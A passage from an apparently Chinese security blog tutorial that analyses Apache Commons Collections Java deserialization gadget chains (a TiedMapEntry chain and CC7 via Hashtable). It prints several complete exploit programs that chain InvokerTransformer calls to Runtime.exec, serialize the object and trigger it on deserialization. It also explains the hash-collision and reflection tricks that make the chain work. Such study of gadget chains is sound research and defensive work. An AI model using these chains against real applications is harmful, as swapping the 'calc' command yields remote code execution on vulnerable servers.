class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> entity;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// TiedMapEntry 的 EXP 编写</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-comment">//上面都一样，就是换了个方法触发get方法</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorateMap, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>); <br><span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);  <br>field.setAccessible(<span class="hljs-literal">true</span>);  <br>field.set(badAttributeValueExpException, tiedMapEntry);<br>serialize(badAttributeValueExpException);  <br>    unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用顺序：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq">BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString<br>-&gt;LazyMap.get-&gt;ChainedTransformer.transform<br>-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform<br>-&gt;Method.invoke-&gt;<span class="hljs-keyword">Class</span>.getMethod<br>-&gt;InvokerTransformer.transform-&gt;Method.invoke<br>-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform<br>-&gt;Method.invoke-&gt;Runtime.exec<br></code></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>主要参考了这两位师傅的文章：</p><p><a href="https://xz.aliyun.com/t/10457">1</a></p><p><a href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/">2</a></p><p>后半条链子与CC1相同，前半部分入口类为：<code>Hashtable</code>，它的<code>readObject</code>方法调用了一个<code>reconstitutionPut</code>方法：</p><p><img src="/img/HashtableReadObject.png" alt="HashtableReadObject"></p><p>跟进这个<code>reconstitutionPut</code>:</p><p><img src="/img/CC701.png" alt="CC701"></p><p>这里有两个可用的方法：<code>equals()</code> 和 <code>hashCode()</code>。(这里有个需要注意的点是：不管是<code>reconstitutionPut</code>方法还是<code>equals</code>方法，都得先进<code>for</code>循环才行)。<code>hashCode</code>的话就是CC6那条，先看<code>equals</code>：</p><p><code>AbstractMap</code> 类中的 <code>equals()</code> 方法中发现其调用了 <code>get()</code> 方法：</p><p><img src="/img/AbstractMap.png" alt="AbstractMap"></p><p>这里<code>equals</code>接受一个<code>object o </code>，然后把这个<code>o</code>传给<code>m</code>，即<code>reconstitutionPut</code>中的<code>key</code></p><p>其实就是通过<code>AbstractMap#equals</code>来调用<code>LazyMap#get</code>。现在试着分析一下这个’’新的’’<code>CC1</code>前半部分：</p><p><code>reconstitutionPut</code>:</p><p><img src="/img/HashTable.png" alt="HashTable"></p><p>这里对传进的 Entry 对象数组进行了循环，逐个调用<code>e.key.equals(key)</code>，这里的<code>e</code>就是个索引。传进去的参数key如果是我们可控的，那么<code>AbstractMap.equals()</code>中的m就是我们可控的(逻辑就是<code>equals</code>接受的参数是<code>Object o</code>，然后<code>Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</code>)。最后要注意这两个<code>key</code>：<code>e.key.equals(key)</code>，前面那个<code>e.key</code> 是该条目的键，而 <code>key</code> 是作为参数传递给 <code>reconstitutionPut</code> 方法的键。所以我们在序列化时可以利用<code>put</code>给<code>hashtable</code>放一个<code>key</code>&#x3D;恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(decorateMap, <span class="hljs-string">&quot;Drunkbaby&quot;</span>);<br></code></pre></td></tr></table></figure><p>然后序列化后用反序列化触发他，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.*;  <br>  <br><span class="hljs-comment">// AbstractMap 的 EXPpublic class AbstractMapEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br> hashtable.put(decorateMap, <span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-comment">//serialize(hashtable);  </span><br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>但这时运行并不会弹计算器，断点打在<code>AbstractMap.equals()</code>然后调试一下，可以发现并没有进到<code>equals</code>里面，官方链子写法如下：</p><p><img src="/img/yso.png" alt="yso"></p><p>可以看到它利用<code>decorate</code>搞出了两个<code>lazymap</code>(EXP中写的那个<code>decorateMap</code>)，然后他给这个<code>map</code>里分别放了键<code>yy</code>和<code>zZ</code>，值都是1。然后把这两个恶意类都放进<code>hashtable</code>里后改了下<code>transformerChain</code>中<code>iTransfomers</code>的值(也就是EXP中写的那个<code>chainedTransformer</code>)。</p><p>这里直接把正确的EXP放上来，对照着分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;&#125;;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc7.bin&quot;</span>));<br>            outputStream.writeObject(hashtable);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc7.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在分析前说下之前的问题：即不管是<code>reconstitutionPut</code>方法还是<code>equals</code>方法，都得先进<code>for</code>循环才行：这里主要看<code>hashtable</code>下的<code>reconstitutionPut</code>中的<code>for</code>循环怎么满足：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure><p>reconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到tabl数组中。</p><p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p><p>添加第一个元素时并不会进入if语句调用equals方法进行判断(e &#x3D; e.next然后第一个if的内容是<code>e.hash == hash</code>，要是只有一个的话连e.next都没有)，因此Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞。</p><p>然后注意这个<code>equals</code>方法：最终利用<code>e.key.equals()</code>调用了<code>LazyMap</code>的<code>equals</code>方法(往<code>hashtable</code>中<code>put</code>了lazymap的实例)，但是LazyMap中并没有equals方法，实际上是调用了LazyMap的父类AbstractMapDecorator的equals方法，虽然AbstractMapDecorator是一个抽象类，但它实现了equals方法。</p><p>第一部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;&#125;;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到这里弄了两个<code>Transformer</code>数组，一个<code>fakeTransformers</code>和一个<code>transformers</code>。这里的用法和我们之前随便改个值那种方法的目标是一样的：</p><p><code>put</code>时同样会触发<code>equals</code>方法：</p><p><img src="/img/putwhat.png" alt="putwhat"></p><p>先用这个<code>fake</code>等<code>put</code>完了通过反射改回来就行。</p><p>第二部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>先将<code>fakeTransformers</code>传入<code>ChainedTransformer</code>对象；</p><p> new两个<code>HashMap</code>对象，都调用<code>LazyMap.decorate</code>，并且分别向两个对象中传值，两个key值分别为<code>yy</code>和<code>zZ</code>，因为需要这两个值的hash值相等，而在java中，<code>yy</code>和<code>zZ</code>的hash值恰好相等；</p><p><img src="/img/20211031133342-1bd17e2e-3a0c-1.png" alt="20211031133342-1bd17e2e-3a0c-1"></p><p>然后将这两个LazyMap类对象put进Hashtable类对象；</p><p>第三部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br>lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<span class="hljs-comment">//删除键为yy的键值对</span><br></code></pre></td></tr></table></figure><p>回顾下这个<code>iTransformers</code>是什么：</p><p><img src="/img/iTransformers.png" 